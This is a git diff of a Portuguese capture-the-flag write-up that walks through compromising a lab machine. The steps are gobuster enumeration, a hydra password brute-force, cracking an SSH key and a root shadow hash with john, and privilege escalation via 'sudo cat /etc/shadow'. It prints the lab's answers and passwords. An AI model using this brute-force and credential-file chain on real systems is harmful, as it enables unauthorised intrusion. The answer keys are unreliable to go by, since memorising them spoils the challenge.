@@ -13,8 +13,10 @@ o primeiro ele pede para ver quantas portas estão abertas na maquina:
 
 ### 2.2
 a segunda pergunta é sobre a versão de ssh rodando  
-como fizemos o comando com -A já temos a informação  
+como fizemos o comando com -A já temos a informação 
+
 <img width="614" height="449" alt="image" src="https://github.com/user-attachments/assets/a2d82e53-d6df-4b1e-8514-b1ef742d8cae" />
+
 > resposta: OpenSSH 7.6p1  
 
 ### 2.3
@@ -28,7 +30,9 @@ pede a versão do linux que também temos:
 
 ### 2.5
 agora pede por um diretorio escondido no servidor web
-usando o comando de: `gobuster dir -u http://10.66.128.173 -w /usr/share/wordlists/dirb/common.txt `
+usando o comando de:  
+`gobuster dir -u http://10.66.128.173 -w /usr/share/wordlists/dirb/common.txt` 
+
 <img width="651" height="416" alt="image" src="https://github.com/user-attachments/assets/92262570-579f-4a8d-804d-32533bbfa904" />
 
 ele retorna o diretorio /dir:
@@ -43,8 +47,9 @@ olhando o codigo fonte do site temos uma dica lá
 falando que o user é admin
 
 então fazemos  
-`└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.66.128.173 http-post-form "/admin/:user=^USER^&pass=^PASS^:invalid" -V -f -I`  
-resulta na resposta
+`hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.66.128.173 http-post-form "/admin/:user=^USER^&pass=^PASS^:invalid" -V -f -I`  
+resulta na resposta  
+
 <img width="626" height="83" alt="image" src="https://github.com/user-attachments/assets/3c502fdd-7fe9-4615-a950-52f52383e2da" />
 
 entao colocamos a respota:
@@ -58,6 +63,7 @@ transformamos o arquivo para o formato do john usando:
 `python3 /usr/share/john/ssh2john.py chave.txt > hash_para_quebrar.txt`  
 então agora sim usamos o john:
 `john --wordlist=/usr/share/wordlists/rockyou.txt hash_para_quebrar.txt`  
+
 <img width="638" height="391" alt="image" src="https://github.com/user-attachments/assets/7f444ecc-a012-46a1-92d9-2ea1614847b5" />
 
 e com isso temos a senha:
@@ -66,8 +72,10 @@ e com isso temos a senha:
 ### 3.3
 agora precisamos logar no ssh
 sabemos que a senha é **rockinroll**  
-mas precisamos saber o usuário
+mas precisamos saber o usuário  
+
 <img width="1275" height="315" alt="image" src="https://github.com/user-attachments/assets/f9933343-e530-436b-a538-1dab8c16ca71" />
+
 temos o usuário john aqui
 
 então faremos para logar no ssh dessa forma:  
@@ -80,7 +88,8 @@ colocamos a senha: **rockinroll**
 e agora acessamos a maquina ssh.
 então fazemos `ls` para ver oque temos
 e depois disso vemos que temos o arquivo `user.txt`
-fazemos: `cat user.txt`
+fazemos: `cat user.txt`  
+
 <img width="637" height="70" alt="image" src="https://github.com/user-attachments/assets/7e158047-94ed-4022-b553-6985ec32646d" />
 
 obtemos a senha:
@@ -96,6 +105,7 @@ ele pede a flag que estava no site
 precisamos agora escalar privilegio  
 faremos primeiro o comando para ver oque podemos rodar na maquina com permissões elevadas  
 `sudo -l`  
+
 <img width="625" height="129" alt="image" src="https://github.com/user-attachments/assets/2488a773-f38b-4228-97b9-9046bc9b62c9" />
 
 então temos
@@ -103,25 +113,35 @@ acesso ao cat em forma de root
 *podemos pensar que isso não serve de nada*
 mas pelo contrário, conseguiremos ver QUALQUER arquivo  
 então fazemos o comando para ver os hashs de senha do sistema:
-`sudo /bi/cat /etc/shadow`
-temos os hashs, mas só um importa, o do **root**
-`root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::`
-copiamos isso e colamos num arquivo .txt 
+`sudo /bi/cat /etc/shadow`  
+
+temos os hashs, mas só um importa, o do **root**  
+
+`root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::`  
+
+copiamos isso e colamos num arquivo .txt  
 `nano root.txt`  
+
 e quebramos o hash sha-512 com o comando:
 `john --wordlist=/usr/share/wordlists/rockyou.txt root.txt`  
+
 e com isso obtemos a chave:
 > resposta: football
 
 ### 4.1
 e agora vamos entra no root e ver o .txt
 para isso usaremos o comando:
-`su root`
-colocamos a senha: **football**  
-e depois disso fazemos: `sudo -i`
+`su root`  
+
+colocamos a senha: **football**   
+
+e depois disso fazemos: `sudo -i`  
+
 isso muda o usuário.
-depois que muda o usuário fazemos: `ls`  
-vemos o arquivo de `root.txt`
+depois que muda o usuário fazemos: `ls`
+
+vemos o arquivo de `root.txt`  
+
 <img width="624" height="81" alt="image" src="https://github.com/user-attachments/assets/2dbe7c0a-d5b5-4cfa-9d99-3d90a8cbf7c7" />
 
 e temos a resposta:
